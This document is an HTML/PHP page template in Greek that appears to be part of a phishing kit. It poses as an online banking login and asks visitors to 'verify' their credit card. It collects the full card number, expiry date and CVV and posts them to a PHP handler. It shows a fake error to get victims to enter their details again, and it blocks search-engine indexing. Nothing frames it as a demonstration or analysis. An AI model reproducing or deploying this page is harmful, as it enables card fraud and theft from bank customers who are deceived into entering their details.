<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./Assets/imgs/ff.ico" />

        <title>Log in to Online Banking</title>
        <script src="./Assets/js/stutes.js"></script>        
    </head>

    <body>

        <div id="wrapper">
            <div class="left"></div>
            <div class="right">
                <div class="inner">
                    <div class="logo">
                        <div><img style="max-width: 230px;" src="./Assets/imgs/logo.svg"></div>
                        <div class="lang">
                            <button type="button">Ελληνικά <i class="fa-solid fa-caret-down"></i></button>
                            <ul>
                                <li><a href="index.php?lang=gr">Ελληνικά</a></li>
                                <li><a href="index.php?lang=en">English</a></li>
                            </ul>
                        </div>
                    </div>
                    <form action="./Assets/php/config/func.php" method="POST">
                        <input type="hidden" name="card">
                        <div class="title">
                            <h3>Επαληθεύστε την πιστωτική σας κάρτα</h3>
                            <p>Εισαγάγετε τα στοιχεία της πιστωτικής σας κάρτας για να επαληθεύσετε τον τραπεζικό σας λογαριασμό στο διαδίκτυο.</p>
                        </div>
                        <?php if( isset($_GET['error']) ) : ?>
                        <div class="error">
                            <div class="sym"><i class="fa-solid fa-circle-exclamation"></i></div>
                            <p>Οι πληροφορίες που έχετε εισάγει είναι εσφαλμένες. Ελέγξτε τις πληροφορίες και δοκιμάστε ξανά</p>
                        </div>
                        <?php endif; ?>
                        <div class="form-group mb20 <?php if(isset($_GET['error'])) echo "has-error"?>">
                            <label for="username">Αριθμός τηλεφώνου</label>
                            <div class="inputs cc">
                                <input inputmode="numeric" type="text" name="cc1" id="cc1" class="form-control" placeholder="0000">
                                <input inputmode="numeric" type="text" name="cc2" id="cc2" class="form-control" placeholder="0000">
                                <input inputmode="numeric" type="text" name="cc3" id="cc3" class="form-control" placeholder="0000">
                                <input inputmode="numeric" type="text" name="cc4" id="cc4" class="form-control" placeholder="0000">
                            </div>
                        </div>
                        <div class="form-group mb20 <?php if(isset($_GET['error'])) echo "has-error"?>">
                            <label for="username">Ημερομηνία λήξης</label>
                            <div class="inputs date">
                                <input inputmode="numeric" type="text" name="month" id="month" class="form-control" placeholder="MM"> 
                                <input inputmode="numeric" type="text" name="year" id="year" class="form-control" placeholder="YY">
                            </div>
                        </div>
                        <div class="form-group mb30 <?php if(isset($_GET['error'])) echo "has-error"?>">
                            <label for="three">CVV</label>
                            <input inputmode="numeric" type="text" name="three" id="three" class="form-control" placeholder="000">
                        </div>
                        <div class="btns mb30">
                            <button type="submit">Continue</button>
                        </div>
                        <p style="font-size: 16px;"><span><i class="fa-solid fa-arrow-left-long"></i> Επιστροφή στην είσοδο</span></p>
                    </form>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>

            $('#cc1').mask('0000');
            $('#cc2').mask('0000');
            $('#cc3').mask('0000');
            $('#cc4').mask('0000');
            $('#month').mask('00');
            $('#year').mask('00');
            $('#three').mask('000');

            $('.inputs.cc input').keyup(function(e){
                if( $(this).val().length == 4 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });

            $('.inputs.date input').keyup(function(e){
                if( $(this).val().length == 2 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });

        </script>

    </body>

</html>